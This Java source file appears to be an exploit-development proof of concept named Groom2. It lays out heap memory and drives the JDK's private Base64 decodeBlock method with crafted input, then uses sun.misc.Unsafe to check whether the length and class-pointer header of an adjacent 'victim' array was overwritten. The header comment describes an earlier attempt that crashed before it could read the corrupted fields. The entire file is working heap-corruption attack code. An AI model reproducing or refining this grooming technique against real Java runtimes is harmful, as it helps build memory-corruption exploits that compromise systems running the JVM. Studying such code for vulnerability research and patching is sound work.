/*
 * Groom2.java - same measurement as Groom.java but through a MethodHandle with an exact
 * signature, so the call does not allocate a boxed Integer for the return value. That
 * boxing path (ValueConversions.unboxInteger) is what killed the previous attempt before
 * we could read the corrupted fields.
 *
 * Run: java --add-opens java.base/java.util=ALL-UNNAMED Groom2.java [runs]
 */
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Base64;

public class Groom2 {

    private static final int SRC_LEN = 130;
    private static final int DST_LEN = (SRC_LEN / 4) * 3;
    private static final int VICTIM_LEN = 96;

    public static void main(String[] args) throws Exception {
        int runs = args.length > 0 ? Integer.parseInt(args[0]) : 6;
        System.out.println("jdk=" + System.getProperty("java.version"));

        Class<?> decCls = Class.forName("java.util.Base64$Decoder");
        Base64.Decoder dec = Base64.getDecoder();
        MethodHandles.Lookup lk = MethodHandles.privateLookupIn(decCls, MethodHandles.lookup());
        MethodHandle mh = lk.findVirtual(decCls, "decodeBlock",
                MethodType.methodType(int.class, byte[].class, int.class, int.class,
                        byte[].class, int.class, boolean.class, boolean.class));

        Field uf = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        sun.misc.Unsafe u = (sun.misc.Unsafe) uf.get(null);
        long base = u.arrayBaseOffset(byte[].class);

        byte[] src = new byte[SRC_LEN];
        Arrays.fill(src, (byte) '/');
        src[SRC_LEN - 1] = '=';
        src[SRC_LEN - 2] = '=';

        byte[] scratch = new byte[DST_LEN];
        for (int i = 0; i < 200_000; i++) {
            try {
                int r = (int) mh.invokeExact(dec, src, 0, SRC_LEN, scratch, 0, false, false);
                if (r < 0) {
                    break;
                }
            } catch (Throwable t) {
                System.out.println("warmup threw " + t);
                break;
            }
        }
        System.out.println("warmup done, base=" + base);

        for (int r = 0; r < runs; r++) {
            byte[] dst = new byte[DST_LEN];
            byte[] victim = new byte[VICTIM_LEN];

            int lenBefore = u.getInt(victim, base - 4);
            int klassBefore = u.getInt(victim, base - 8);

            int ret;
            try {
                ret = (int) mh.invokeExact(dec, src, 0, SRC_LEN, dst, 0, false, false);
            } catch (Throwable t) {
                System.out.println("run " + r + ": threw " + t);
                continue;
            }

            int lenAfter = u.getInt(victim, base - 4);
            int klassAfter = u.getInt(victim, base - 8);
            System.out.printf("run %d: ret=%d  len %d->%d %s  klass %08x->%08x %s%n",
                    r, ret, lenBefore, lenAfter,
                    lenBefore == lenAfter ? "(same)" : "** CHANGED **",
                    klassBefore, klassAfter,
                    klassBefore == klassAfter ? "(same)" : "** CHANGED **");
        }
        System.out.println("survived all runs");
    }
}
